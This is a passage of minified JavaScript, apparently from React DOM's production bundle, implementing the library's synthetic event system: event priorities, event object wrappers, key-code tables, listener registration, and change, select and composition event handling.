            var r = new (n = e.nativeEvent).constructor(n.type, n);
            (ve = r), n.target.dispatchEvent(r), (ve = null), t.shift();
          }
          return !0;
        }
        function Dt(e, t, n) {
          Ht(e) && n.delete(t);
        }
        function Mt() {
          (Tt = !1),
            null !== It && Ht(It) && (It = null),
            null !== Ot && Ht(Ot) && (Ot = null),
            null !== Bt && Ht(Bt) && (Bt = null),
            Pt.forEach(Dt),
            _t.forEach(Dt);
        }
        function Ft(e, t) {
          e.blockedOn === t &&
            ((e.blockedOn = null),
            Tt ||
              ((Tt = !0),
              i.unstable_scheduleCallback(i.unstable_NormalPriority, Mt)));
        }
        function jt(e) {
          function t(t) {
            return Ft(t, e);
          }
          if (0 < Ct.length) {
            Ft(Ct[0], e);
            for (var n = 1; n < Ct.length; n++) {
              var r = Ct[n];
              r.blockedOn === e && (r.blockedOn = null);
            }
          }
          for (
            null !== It && Ft(It, e),
              null !== Ot && Ft(Ot, e),
              null !== Bt && Ft(Bt, e),
              Pt.forEach(t),
              _t.forEach(t),
              n = 0;
            n < Ut.length;
            n++
          )
            (r = Ut[n]).blockedOn === e && (r.blockedOn = null);
          for (; 0 < Ut.length && null === (n = Ut[0]).blockedOn; )
            $t(n), null === n.blockedOn && Ut.shift();
        }
        var zt = v.ReactCurrentBatchConfig,
          Kt = !0;
        function Wt(e, t, n, r) {
          var i = bt,
            o = zt.transition;
          zt.transition = null;
          try {
            (bt = 1), qt(e, t, n, r);
          } finally {
            (bt = i), (zt.transition = o);
          }
        }
        function Vt(e, t, n, r) {
          var i = bt,
            o = zt.transition;
          zt.transition = null;
          try {
            (bt = 4), qt(e, t, n, r);
          } finally {
            (bt = i), (zt.transition = o);
          }
        }
        function qt(e, t, n, r) {
          if (Kt) {
            var i = Yt(e, t, n, r);
            if (null === i) Kr(e, t, r, Gt, n), Rt(e, r);
            else if (
              (function (e, t, n, r, i) {
                switch (t) {
                  case "focusin":
                    return (It = Lt(It, e, t, n, r, i)), !0;
                  case "dragenter":
                    return (Ot = Lt(Ot, e, t, n, r, i)), !0;
                  case "mouseover":
                    return (Bt = Lt(Bt, e, t, n, r, i)), !0;
                  case "pointerover":
                    var o = i.pointerId;
                    return Pt.set(o, Lt(Pt.get(o) || null, e, t, n, r, i)), !0;
                  case "gotpointercapture":
                    return (
                      (o = i.pointerId),
                      _t.set(o, Lt(_t.get(o) || null, e, t, n, r, i)),
                      !0
                    );
                }
                return !1;
              })(i, e, t, n, r)
            )
              r.stopPropagation();
            else if ((Rt(e, r), 4 & t && -1 < Nt.indexOf(e))) {
              for (; null !== i; ) {
                var o = bi(i);
                if (
                  (null !== o && Et(o),
                  null === (o = Yt(e, t, n, r)) && Kr(e, t, r, Gt, n),
                  o === i)
                )
                  break;
                i = o;
              }
              null !== i && r.stopPropagation();
            } else Kr(e, t, r, null, n);
          }
        }
        var Gt = null;
        function Yt(e, t, n, r) {
          if (((Gt = null), null !== (e = mi((e = Ee(r))))))
            if (null === (t = je(e))) e = null;
            else if (13 === (n = t.tag)) {
              if (null !== (e = ze(t))) return e;
              e = null;
            } else if (3 === n) {
              if (t.stateNode.current.memoizedState.isDehydrated)
                return 3 === t.tag ? t.stateNode.containerInfo : null;
              e = null;
            } else t !== e && (e = null);
          return (Gt = e), null;
        }
        function Zt(e) {
          switch (e) {
            case "cancel":
            case "click":
            case "close":
            case "contextmenu":
            case "copy":
            case "cut":
            case "auxclick":
            case "dblclick":
            case "dragend":
            case "dragstart":
            case "drop":
            case "focusin":
            case "focusout":
            case "input":
            case "invalid":
            case "keydown":
            case "keypress":
            case "keyup":
            case "mousedown":
            case "mouseup":
            case "paste":
            case "pause":
            case "play":
            case "pointercancel":
            case "pointerdown":
            case "pointerup":
            case "ratechange":
            case "reset":
            case "resize":
            case "seeked":
            case "submit":
            case "touchcancel":
            case "touchend":
            case "touchstart":
            case "volumechange":
            case "change":
            case "selectionchange":
            case "textInput":
            case "compositionstart":
            case "compositionend":
            case "compositionupdate":
            case "beforeblur":
            case "afterblur":
            case "beforeinput":
            case "blur":
            case "fullscreenchange":
            case "focus":
            case "hashchange":
            case "popstate":
            case "select":
            case "selectstart":
              return 1;
            case "drag":
            case "dragenter":
            case "dragexit":
            case "dragleave":
            case "dragover":
            case "mousemove":
            case "mouseout":
            case "mouseover":
            case "pointermove":
            case "pointerout":
            case "pointerover":
            case "scroll":
            case "toggle":
            case "touchmove":
            case "wheel":
            case "mouseenter":
            case "mouseleave":
            case "pointerenter":
            case "pointerleave":
              return 4;
            case "message":
              switch (Xe()) {
                case Qe:
                  return 1;
                case et:
                  return 4;
                case tt:
                case nt:
                  return 16;
                case rt:
                  return 536870912;
                default:
                  return 16;
              }
            default:
              return 16;
          }
        }
        var Jt = null,
          Xt = null,
          Qt = null;
        function en() {
          if (Qt) return Qt;
          var e,
            t,
            n = Xt,
            r = n.length,
            i = "value" in Jt ? Jt.value : Jt.textContent,
            o = i.length;
          for (e = 0; e < r && n[e] === i[e]; e++);
          var s = r - e;
          for (t = 1; t <= s && n[r - t] === i[o - t]; t++);
          return (Qt = i.slice(e, 1 < t ? 1 - t : void 0));
        }
        function tn(e) {
          var t = e.keyCode;
          return (
            "charCode" in e
              ? 0 === (e = e.charCode) && 13 === t && (e = 13)
              : (e = t),
            10 === e && (e = 13),
            32 <= e || 13 === e ? e : 0
          );
        }
        function nn() {
          return !0;
        }
        function rn() {
          return !1;
        }
        function on(e) {
          function t(t, n, r, i, o) {
            for (var s in ((this._reactName = t),
            (this._targetInst = r),
            (this.type = n),
            (this.nativeEvent = i),
            (this.target = o),
            (this.currentTarget = null),
            e))
              e.hasOwnProperty(s) && ((t = e[s]), (this[s] = t ? t(i) : i[s]));
            return (
              (this.isDefaultPrevented = (
                null != i.defaultPrevented
                  ? i.defaultPrevented
                  : !1 === i.returnValue
              )
                ? nn
                : rn),
              (this.isPropagationStopped = rn),
              this
            );
          }
          return (
            $(t.prototype, {
              preventDefault: function () {
                this.defaultPrevented = !0;
                var e = this.nativeEvent;
                e &&
                  (e.preventDefault
                    ? e.preventDefault()
                    : "unknown" !== typeof e.returnValue &&
                      (e.returnValue = !1),
                  (this.isDefaultPrevented = nn));
              },
              stopPropagation: function () {
                var e = this.nativeEvent;
                e &&
                  (e.stopPropagation
                    ? e.stopPropagation()
                    : "unknown" !== typeof e.cancelBubble &&
                      (e.cancelBubble = !0),
                  (this.isPropagationStopped = nn));
              },
              persist: function () {},
              isPersistent: nn,
            }),
            t
          );
        }
        var sn,
          an,
          ln,
          cn = {
            eventPhase: 0,
            bubbles: 0,
            cancelable: 0,
            timeStamp: function (e) {
              return e.timeStamp || Date.now();
            },
            defaultPrevented: 0,
            isTrusted: 0,
          },
          un = on(cn),
          fn = $({}, cn, { view: 0, detail: 0 }),
          hn = on(fn),
          dn = $({}, fn, {
            screenX: 0,
            screenY: 0,
            clientX: 0,
            clientY: 0,
            pageX: 0,
            pageY: 0,
            ctrlKey: 0,
            shiftKey: 0,
            altKey: 0,
            metaKey: 0,
            getModifierState: kn,
            button: 0,
            buttons: 0,
            relatedTarget: function (e) {
              return void 0 === e.relatedTarget
                ? e.fromElement === e.srcElement
                  ? e.toElement
                  : e.fromElement
                : e.relatedTarget;
            },
            movementX: function (e) {
              return "movementX" in e
                ? e.movementX
                : (e !== ln &&
                    (ln && "mousemove" === e.type
                      ? ((sn = e.screenX - ln.screenX),
                        (an = e.screenY - ln.screenY))
                      : (an = sn = 0),
                    (ln = e)),
                  sn);
            },
            movementY: function (e) {
              return "movementY" in e ? e.movementY : an;
            },
          }),
          pn = on(dn),
          gn = on($({}, dn, { dataTransfer: 0 })),
          yn = on($({}, fn, { relatedTarget: 0 })),
          wn = on(
            $({}, cn, { animationName: 0, elapsedTime: 0, pseudoElement: 0 })
          ),
          mn = $({}, cn, {
            clipboardData: function (e) {
              return "clipboardData" in e
                ? e.clipboardData
                : window.clipboardData;
            },
          }),
          bn = on(mn),
          vn = on($({}, cn, { data: 0 })),
          En = {
            Esc: "Escape",
            Spacebar: " ",
            Left: "ArrowLeft",
            Up: "ArrowUp",
            Right: "ArrowRight",
            Down: "ArrowDown",
            Del: "Delete",
            Win: "OS",
            Menu: "ContextMenu",
            Apps: "ContextMenu",
            Scroll: "ScrollLock",
            MozPrintableKey: "Unidentified",
          },
          Sn = {
            8: "Backspace",
            9: "Tab",
            12: "Clear",
            13: "Enter",
            16: "Shift",
            17: "Control",
            18: "Alt",
            19: "Pause",
            20: "CapsLock",
            27: "Escape",
            32: " ",
            33: "PageUp",
            34: "PageDown",
            35: "End",
            36: "Home",
            37: "ArrowLeft",
            38: "ArrowUp",
            39: "ArrowRight",
            40: "ArrowDown",
            45: "Insert",
            46: "Delete",
            112: "F1",
            113: "F2",
            114: "F3",
            115: "F4",
            116: "F5",
            117: "F6",
            118: "F7",
            119: "F8",
            120: "F9",
            121: "F10",
            122: "F11",
            123: "F12",
            144: "NumLock",
            145: "ScrollLock",
            224: "Meta",
          },
          xn = {
            Alt: "altKey",
            Control: "ctrlKey",
            Meta: "metaKey",
            Shift: "shiftKey",
          };
        function An(e) {
          var t = this.nativeEvent;
          return t.getModifierState
            ? t.getModifierState(e)
            : !!(e = xn[e]) && !!t[e];
        }
        function kn() {
          return An;
        }
        var Tn = $({}, fn, {
            key: function (e) {
              if (e.key) {
                var t = En[e.key] || e.key;
                if ("Unidentified" !== t) return t;
              }
              return "keypress" === e.type
                ? 13 === (e = tn(e))
                  ? "Enter"
                  : String.fromCharCode(e)
                : "keydown" === e.type || "keyup" === e.type
                ? Sn[e.keyCode] || "Unidentified"
                : "";
            },
            code: 0,
            location: 0,
            ctrlKey: 0,
            shiftKey: 0,
            altKey: 0,
            metaKey: 0,
            repeat: 0,
            locale: 0,
            getModifierState: kn,
            charCode: function (e) {
              return "keypress" === e.type ? tn(e) : 0;
            },
            keyCode: function (e) {
              return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
            },
            which: function (e) {
              return "keypress" === e.type
                ? tn(e)
                : "keydown" === e.type || "keyup" === e.type
                ? e.keyCode
                : 0;
            },
          }),
          Cn = on(Tn),
          In = on(
            $({}, dn, {
              pointerId: 0,
              width: 0,
              height: 0,
              pressure: 0,
              tangentialPressure: 0,
              tiltX: 0,
              tiltY: 0,
              twist: 0,
              pointerType: 0,
              isPrimary: 0,
            })
          ),
          On = on(
            $({}, fn, {
              touches: 0,
              targetTouches: 0,
              changedTouches: 0,
              altKey: 0,
              metaKey: 0,
              ctrlKey: 0,
              shiftKey: 0,
              getModifierState: kn,
            })
          ),
          Bn = on(
            $({}, cn, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 })
          ),
          Pn = $({}, dn, {
            deltaX: function (e) {
              return "deltaX" in e
                ? e.deltaX
                : "wheelDeltaX" in e
                ? -e.wheelDeltaX
                : 0;
            },
            deltaY: function (e) {
              return "deltaY" in e
                ? e.deltaY
                : "wheelDeltaY" in e
                ? -e.wheelDeltaY
                : "wheelDelta" in e
                ? -e.wheelDelta
                : 0;
            },
            deltaZ: 0,
            deltaMode: 0,
          }),
          _n = on(Pn),
          Un = [9, 13, 27, 32],
          Nn = u && "CompositionEvent" in window,
          Rn = null;
        u && "documentMode" in document && (Rn = document.documentMode);
        var Ln = u && "TextEvent" in window && !Rn,
          $n = u && (!Nn || (Rn && 8 < Rn && 11 >= Rn)),
          Hn = String.fromCharCode(32),
          Dn = !1;
        function Mn(e, t) {
          switch (e) {
            case "keyup":
              return -1 !== Un.indexOf(t.keyCode);
            case "keydown":
              return 229 !== t.keyCode;
            case "keypress":
            case "mousedown":
            case "focusout":
              return !0;
            default:
              return !1;
          }
        }
        function Fn(e) {
          return "object" === typeof (e = e.detail) && "data" in e
            ? e.data
            : null;
        }
        var jn = !1;
        var zn = {
          color: !0,
          date: !0,
          datetime: !0,
          "datetime-local": !0,
          email: !0,
          month: !0,
          number: !0,
          password: !0,
          range: !0,
          search: !0,
          tel: !0,
          text: !0,
          time: !0,
          url: !0,
          week: !0,
        };
        function Kn(e) {
          var t = e && e.nodeName && e.nodeName.toLowerCase();
          return "input" === t ? !!zn[e.type] : "textarea" === t;
        }
        function Wn(e, t, n, r) {
          Te(r),
            0 < (t = Vr(t, "onChange")).length &&
              ((n = new un("onChange", "change", null, n, r)),
              e.push({ event: n, listeners: t }));
        }
        var Vn = null,
          qn = null;
        function Gn(e) {
          Hr(e, 0);
        }
        function Yn(e) {
          if (q(vi(e))) return e;
        }
        function Zn(e, t) {
          if ("change" === e) return t;
        }
        var Jn = !1;
        if (u) {
          var Xn;
          if (u) {
            var Qn = "oninput" in document;
            if (!Qn) {
              var er = document.createElement("div");
              er.setAttribute("oninput", "return;"),
                (Qn = "function" === typeof er.oninput);
            }
            Xn = Qn;
          } else Xn = !1;
          Jn = Xn && (!document.documentMode || 9 < document.documentMode);
        }
        function tr() {
          Vn && (Vn.detachEvent("onpropertychange", nr), (qn = Vn = null));
        }
        function nr(e) {
          if ("value" === e.propertyName && Yn(qn)) {
            var t = [];
            Wn(t, qn, e, Ee(e)), Pe(Gn, t);
          }
        }
        function rr(e, t, n) {
          "focusin" === e
            ? (tr(), (qn = n), (Vn = t).attachEvent("onpropertychange", nr))
            : "focusout" === e && tr();
        }
        function ir(e) {
          if ("selectionchange" === e || "keyup" === e || "keydown" === e)
            return Yn(qn);
        }
        function or(e, t) {
          if ("click" === e) return Yn(t);
        }
        function sr(e, t) {
          if ("input" === e || "change" === e) return Yn(t);
        }
        var ar =
          "function" === typeof Object.is
            ? Object.is
            : function (e, t) {
                return (
                  (e === t && (0 !== e || 1 / e === 1 / t)) ||
                  (e !== e && t !== t)
                );
              };
        function lr(e, t) {
          if (ar(e, t)) return !0;
          if (
            "object" !== typeof e ||
            null === e ||
            "object" !== typeof t ||
            null === t
          )
            return !1;
          var n = Object.keys(e),
            r = Object.keys(t);
          if (n.length !== r.length) return !1;
          for (r = 0; r < n.length; r++) {
            var i = n[r];
            if (!f.call(t, i) || !ar(e[i], t[i])) return !1;
          }
          return !0;
        }
        function cr(e) {
          for (; e && e.firstChild; ) e = e.firstChild;
          return e;
        }
        function ur(e, t) {
          var n,
            r = cr(e);
          for (e = 0; r; ) {
            if (3 === r.nodeType) {
              if (((n = e + r.textContent.length), e <= t && n >= t))
                return { node: r, offset: t - e };
              e = n;
            }
            e: {
              for (; r; ) {
                if (r.nextSibling) {
                  r = r.nextSibling;
                  break e;
                }
                r = r.parentNode;
              }
              r = void 0;
            }
            r = cr(r);
          }
        }
        function fr(e, t) {
          return (
            !(!e || !t) &&
            (e === t ||
              ((!e || 3 !== e.nodeType) &&
                (t && 3 === t.nodeType
                  ? fr(e, t.parentNode)
                  : "contains" in e
                  ? e.contains(t)
                  : !!e.compareDocumentPosition &&
                    !!(16 & e.compareDocumentPosition(t)))))
          );
        }
        function hr() {
          for (var e = window, t = G(); t instanceof e.HTMLIFrameElement; ) {
            try {
              var n = "string" === typeof t.contentWindow.location.href;
            } catch (r) {
              n = !1;
            }
            if (!n) break;
            t = G((e = t.contentWindow).document);
          }
          return t;
        }
        function dr(e) {
          var t = e && e.nodeName && e.nodeName.toLowerCase();
          return (
            t &&
            (("input" === t &&
              ("text" === e.type ||
                "search" === e.type ||
                "tel" === e.type ||
                "url" === e.type ||
                "password" === e.type)) ||
              "textarea" === t ||
              "true" === e.contentEditable)
          );
        }
        function pr(e) {
          var t = hr(),
            n = e.focusedElem,
            r = e.selectionRange;
          if (
            t !== n &&
            n &&
            n.ownerDocument &&
            fr(n.ownerDocument.documentElement, n)
          ) {
            if (null !== r && dr(n))
              if (
                ((t = r.start),
                void 0 === (e = r.end) && (e = t),
                "selectionStart" in n)
              )
                (n.selectionStart = t),
                  (n.selectionEnd = Math.min(e, n.value.length));
              else if (
                (e =
                  ((t = n.ownerDocument || document) && t.defaultView) ||
                  window).getSelection
              ) {
                e = e.getSelection();
                var i = n.textContent.length,
                  o = Math.min(r.start, i);
                (r = void 0 === r.end ? o : Math.min(r.end, i)),
                  !e.extend && o > r && ((i = r), (r = o), (o = i)),
                  (i = ur(n, o));
                var s = ur(n, r);
                i &&
                  s &&
                  (1 !== e.rangeCount ||
                    e.anchorNode !== i.node ||
                    e.anchorOffset !== i.offset ||
                    e.focusNode !== s.node ||
                    e.focusOffset !== s.offset) &&
                  ((t = t.createRange()).setStart(i.node, i.offset),
                  e.removeAllRanges(),
                  o > r
                    ? (e.addRange(t), e.extend(s.node, s.offset))
                    : (t.setEnd(s.node, s.offset), e.addRange(t)));
              }
            for (t = [], e = n; (e = e.parentNode); )
              1 === e.nodeType &&
                t.push({ element: e, left: e.scrollLeft, top: e.scrollTop });
            for (
              "function" === typeof n.focus && n.focus(), n = 0;
              n < t.length;
              n++
            )
              ((e = t[n]).element.scrollLeft = e.left),
                (e.element.scrollTop = e.top);
          }
        }
        var gr = u && "documentMode" in document && 11 >= document.documentMode,
          yr = null,
          wr = null,
          mr = null,
          br = !1;
        function vr(e, t, n) {
          var r =
            n.window === n
              ? n.document
              : 9 === n.nodeType
              ? n
              : n.ownerDocument;
          br ||
            null == yr ||
            yr !== G(r) ||
            ("selectionStart" in (r = yr) && dr(r)
              ? (r = { start: r.selectionStart, end: r.selectionEnd })
              : (r = {
                  anchorNode: (r = (
                    (r.ownerDocument && r.ownerDocument.defaultView) ||
                    window
                  ).getSelection()).anchorNode,
                  anchorOffset: r.anchorOffset,
                  focusNode: r.focusNode,
                  focusOffset: r.focusOffset,
                }),
            (mr && lr(mr, r)) ||
              ((mr = r),
              0 < (r = Vr(wr, "onSelect")).length &&
                ((t = new un("onSelect", "select", null, t, n)),
                e.push({ event: t, listeners: r }),
                (t.target = yr))));
        }
        function Er(e, t) {
          var n = {};
          return (
            (n[e.toLowerCase()] = t.toLowerCase()),
            (n["Webkit" + e] = "webkit" + t),
            (n["Moz" + e] = "moz" + t),
            n
          );
        }
        var Sr = {
            animationend: Er("Animation", "AnimationEnd"),
            animationiteration: Er("Animation", "AnimationIteration"),
            animationstart: Er("Animation", "AnimationStart"),
            transitionend: Er("Transition", "TransitionEnd"),
          },
          xr = {},
          Ar = {};
        function kr(e) {
          if (xr[e]) return xr[e];
          if (!Sr[e]) return e;
          var t,
            n = Sr[e];
          for (t in n)
            if (n.hasOwnProperty(t) && t in Ar) return (xr[e] = n[t]);
          return e;
        }
        u &&
          ((Ar = document.createElement("div").style),
          "AnimationEvent" in window ||
            (delete Sr.animationend.animation,
            delete Sr.animationiteration.animation,
            delete Sr.animationstart.animation),
          "TransitionEvent" in window || delete Sr.transitionend.transition);
        var Tr = kr("animationend"),
          Cr = kr("animationiteration"),
          Ir = kr("animationstart"),
          Or = kr("transitionend"),
          Br = new Map(),
          Pr =
            "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
              " "
            );
        function _r(e, t) {
          Br.set(e, t), l(t, [e]);
        }
        for (var Ur = 0; Ur < Pr.length; Ur++) {
          var Nr = Pr[Ur];
          _r(Nr.toLowerCase(), "on" + (Nr[0].toUpperCase() + Nr.slice(1)));
        }
        _r(Tr, "onAnimationEnd"),
          _r(Cr, "onAnimationIteration"),
          _r(Ir, "onAnimationStart"),
          _r("dblclick", "onDoubleClick"),
          _r("focusin", "onFocus"),
          _r("focusout", "onBlur"),
          _r(Or, "onTransitionEnd"),
          c("onMouseEnter", ["mouseout", "mouseover"]),
          c("onMouseLeave", ["mouseout", "mouseover"]),
          c("onPointerEnter", ["pointerout", "pointerover"]),
          c("onPointerLeave", ["pointerout", "pointerover"]),
          l(
            "onChange",
            "change click focusin focusout input keydown keyup selectionchange".split(
              " "
            )
          ),
          l(
            "onSelect",
            "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
              " "
            )
          ),
          l("onBeforeInput", [
            "compositionend",
            "keypress",
            "textInput",
            "paste",
          ]),
          l(
            "onCompositionEnd",
            "compositionend focusout keydown keypress keyup mousedown".split(
              " "
            )
          ),
          l(
            "onCompositionStart",
            "compositionstart focusout keydown keypress keyup mousedown".split(
              " "
            )
          ),
          l(
            "onCompositionUpdate",
            "compositionupdate focusout keydown keypress keyup mousedown".split(
              " "
            )
          );
        var Rr =
            "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
              " "
            ),
          Lr = new Set(
            "cancel close invalid load scroll toggle".split(" ").concat(Rr)
          );
        function $r(e, t, n) {
          var r = e.type || "unknown-event";
          (e.currentTarget = n),
            (function (e, t, n, r, i, s, a, l, c) {
              if ((Fe.apply(this, arguments), Le)) {
                if (!Le) throw Error(o(198));
                var u = $e;
                (Le = !1), ($e = null), He || ((He = !0), (De = u));
              }
            })(r, t, void 0, e),
            (e.currentTarget = null);
        }
        function Hr(e, t) {
          t = 0 !== (4 & t);
          for (var n = 0; n < e.length; n++) {
            var r = e[n],
              i = r.event;
            r = r.listeners;
            e: {
              var o = void 0;
              if (t)
                for (var s = r.length - 1; 0 <= s; s--) {
                  var a = r[s],
                    l = a.instance,
                    c = a.currentTarget;
                  if (((a = a.listener), l !== o && i.isPropagationStopped()))
                    break e;
                  $r(i, a, c), (o = l);
                }
              else
                for (s = 0; s < r.length; s++) {
                  if (
                    ((l = (a = r[s]).instance),
                    (c = a.currentTarget),
                    (a = a.listener),
                    l !== o && i.isPropagationStopped())
                  )
                    break e;
                  $r(i, a, c), (o = l);
                }
            }
          }
          if (He) throw ((e = De), (He = !1), (De = null), e);
        }
        function Dr(e, t) {
          var n = t[gi];
          void 0 === n && (n = t[gi] = new Set());
          var r = e + "__bubble";
          n.has(r) || (zr(t, e, 2, !1), n.add(r));
        }
        function Mr(e, t, n) {
          var r = 0;
          t && (r |= 4), zr(n, e, r, t);
        }
        var Fr = "_reactListening" + Math.random().toString(36).slice(2);
        function jr(e) {
          if (!e[Fr]) {
            (e[Fr] = !0),
              s.forEach(function (t) {
                "selectionchange" !== t &&
                  (Lr.has(t) || Mr(t, !1, e), Mr(t, !0, e));
              });
            var t = 9 === e.nodeType ? e : e.ownerDocument;
            null === t || t[Fr] || ((t[Fr] = !0), Mr("selectionchange", !1, t));
          }
        }
        function zr(e, t, n, r) {
          switch (Zt(t)) {
            case 1:
              var i = Wt;
              break;
            case 4:
              i = Vt;
              break;
            default:
              i = qt;
          }
          (n = i.bind(null, t, n, e)),
            (i = void 0),
            !Ue ||
              ("touchstart" !== t && "touchmove" !== t && "wheel" !== t) ||
              (i = !0),
            r
              ? void 0 !== i
                ? e.addEventListener(t, n, { capture: !0, passive: i })
                : e.addEventListener(t, n, !0)
              : void 0 !== i
              ? e.addEventListener(t, n, { passive: i })
              : e.addEventListener(t, n, !1);
        }
        function Kr(e, t, n, r, i) {
          var o = r;
          if (0 === (1 & t) && 0 === (2 & t) && null !== r)
            e: for (;;) {
              if (null === r) return;
              var s = r.tag;
              if (3 === s || 4 === s) {
                var a = r.stateNode.containerInfo;
                if (a === i || (8 === a.nodeType && a.parentNode === i)) break;
                if (4 === s)
                  for (s = r.return; null !== s; ) {
                    var l = s.tag;
                    if (
                      (3 === l || 4 === l) &&
                      ((l = s.stateNode.containerInfo) === i ||
                        (8 === l.nodeType && l.parentNode === i))
                    )
                      return;
                    s = s.return;
                  }
                for (; null !== a; ) {
                  if (null === (s = mi(a))) return;
                  if (5 === (l = s.tag) || 6 === l) {
                    r = o = s;
                    continue e;
                  }
                  a = a.parentNode;
                }
              }
              r = r.return;
            }
          Pe(function () {
            var r = o,
              i = Ee(n),
              s = [];
            e: {
              var a = Br.get(e);
              if (void 0 !== a) {
                var l = un,
                  c = e;
                switch (e) {
                  case "keypress":
                    if (0 === tn(n)) break e;
                  case "keydown":
                  case "keyup":
                    l = Cn;
                    break;
                  case "focusin":
                    (c = "focus"), (l = yn);
                    break;
                  case "focusout":
                    (c = "blur"), (l = yn);
                    break;
                  case "beforeblur":
                  case "afterblur":
                    l = yn;
                    break;
                  case "click":
                    if (2 === n.button) break e;
                  case "auxclick":
                  case "dblclick":
                  case "mousedown":
                  case "mousemove":
                  case "mouseup":
                  case "mouseout":
                  case "mouseover":
                  case "contextmenu":
                    l = pn;
                    break;
                  case "drag":
                  case "dragend":
                  case "dragenter":
                  case "dragexit":
                  case "dragleave":
                  case "dragover":
                  case "dragstart":
                  case "drop":
                    l = gn;
                    break;
                  case "touchcancel":
                  case "touchend":
                  case "touchmove":
                  case "touchstart":
                    l = On;
                    break;
                  case Tr:
                  case Cr:
                  case Ir:
                    l = wn;
                    break;
                  case Or:
                    l = Bn;
                    break;
                  case "scroll":
                    l = hn;
                    break;
                  case "wheel":
                    l = _n;
                    break;
                  case "copy":
                  case "cut":
                  case "paste":
                    l = bn;
                    break;
                  case "gotpointercapture":
                  case "lostpointercapture":
                  case "pointercancel":
                  case "pointerdown":
                  case "pointermove":
                  case "pointerout":
                  case "pointerover":
                  case "pointerup":
                    l = In;
                }
                var u = 0 !== (4 & t),
                  f = !u && "scroll" === e,
                  h = u ? (null !== a ? a + "Capture" : null) : a;
                u = [];
                for (var d, p = r; null !== p; ) {
                  var g = (d = p).stateNode;
                  if (
                    (5 === d.tag &&
                      null !== g &&
                      ((d = g),
                      null !== h &&
                        null != (g = _e(p, h)) &&
                        u.push(Wr(p, g, d))),
                    f)
                  )
                    break;
                  p = p.return;
                }
                0 < u.length &&
                  ((a = new l(a, c, null, n, i)),
                  s.push({ event: a, listeners: u }));
              }
            }
            if (0 === (7 & t)) {
              if (
                ((l = "mouseout" === e || "pointerout" === e),
                (!(a = "mouseover" === e || "pointerover" === e) ||
                  n === ve ||
                  !(c = n.relatedTarget || n.fromElement) ||
                  (!mi(c) && !c[pi])) &&
                  (l || a) &&
                  ((a =
                    i.window === i
                      ? i
                      : (a = i.ownerDocument)
                      ? a.defaultView || a.parentWindow
                      : window),
                  l
                    ? ((l = r),
                      null !==
                        (c = (c = n.relatedTarget || n.toElement)
                          ? mi(c)
                          : null) &&
                        (c !== (f = je(c)) || (5 !== c.tag && 6 !== c.tag)) &&
                        (c = null))
                    : ((l = null), (c = r)),
                  l !== c))
              ) {
                if (
                  ((u = pn),
                  (g = "onMouseLeave"),
                  (h = "onMouseEnter"),
                  (p = "mouse"),
                  ("pointerout" !== e && "pointerover" !== e) ||
                    ((u = In),
                    (g = "onPointerLeave"),
                    (h = "onPointerEnter"),
                    (p = "pointer")),
                  (f = null == l ? a : vi(l)),
                  (d = null == c ? a : vi(c)),
                  ((a = new u(g, p + "leave", l, n, i)).target = f),
                  (a.relatedTarget = d),
                  (g = null),
                  mi(i) === r &&
                    (((u = new u(h, p + "enter", c, n, i)).target = d),
                    (u.relatedTarget = f),
                    (g = u)),
                  (f = g),
                  l && c)
                )
                  e: {
                    for (h = c, p = 0, d = u = l; d; d = qr(d)) p++;
                    for (d = 0, g = h; g; g = qr(g)) d++;
                    for (; 0 < p - d; ) (u = qr(u)), p--;
                    for (; 0 < d - p; ) (h = qr(h)), d--;
                    for (; p--; ) {
                      if (u === h || (null !== h && u === h.alternate)) break e;
                      (u = qr(u)), (h = qr(h));
                    }
                    u = null;
                  }
                else u = null;
                null !== l && Gr(s, a, l, u, !1),
                  null !== c && null !== f && Gr(s, f, c, u, !0);
              }
              if (
                "select" ===
                  (l =
                    (a = r ? vi(r) : window).nodeName &&
                    a.nodeName.toLowerCase()) ||
                ("input" === l && "file" === a.type)
              )
                var y = Zn;
              else if (Kn(a))
                if (Jn) y = sr;
                else {
                  y = ir;
                  var w = rr;
                }
              else
                (l = a.nodeName) &&
                  "input" === l.toLowerCase() &&
                  ("checkbox" === a.type || "radio" === a.type) &&
                  (y = or);
              switch (
                (y && (y = y(e, r))
                  ? Wn(s, y, n, i)
                  : (w && w(e, a, r),
                    "focusout" === e &&
                      (w = a._wrapperState) &&
                      w.controlled &&
                      "number" === a.type &&
                      ee(a, "number", a.value)),
                (w = r ? vi(r) : window),
                e)
              ) {
                case "focusin":
                  (Kn(w) || "true" === w.contentEditable) &&
                    ((yr = w), (wr = r), (mr = null));
                  break;
                case "focusout":
                  mr = wr = yr = null;
                  break;
                case "mousedown":
                  br = !0;
                  break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                  (br = !1), vr(s, n, i);
                  break;
                case "selectionchange":
                  if (gr) break;
                case "keydown":
                case "keyup":
                  vr(s, n, i);
              }
              var m;
              if (Nn)
                e: {
                  switch (e) {
                    case "compositionstart":
                      var b = "onCompositionStart";
                      break e;
                    case "compositionend":
                      b = "onCompositionEnd";
                      break e;
                    case "compositionupdate":
                      b = "onCompositionUpdate";
                      break e;
                  }
                  b = void 0;
                }
              else
                jn
                  ? Mn(e, n) && (b = "onCompositionEnd")
                  : "keydown" === e &&
                    229 === n.keyCode &&
                    (b = "onCompositionStart");
              b &&
                ($n &&
                  "ko" !== n.locale &&
                  (jn || "onCompositionStart" !== b
                    ? "onCompositionEnd" === b && jn && (m = en())
                    : ((Xt = "value" in (Jt = i) ? Jt.value : Jt.textContent),
                      (jn = !0))),
                0 < (w = Vr(r, b)).length &&
                  ((b = new vn(b, e, null, n, i)),
                  s.push({ event: b, listeners: w }),
                  m ? (b.data = m) : null !== (m = Fn(n)) && (b.data = m))),
                (m = Ln
                  ? (function (e, t) {
                      switch (e) {
                        case "compositionend":
                          return Fn(t);
                        case "keypress":
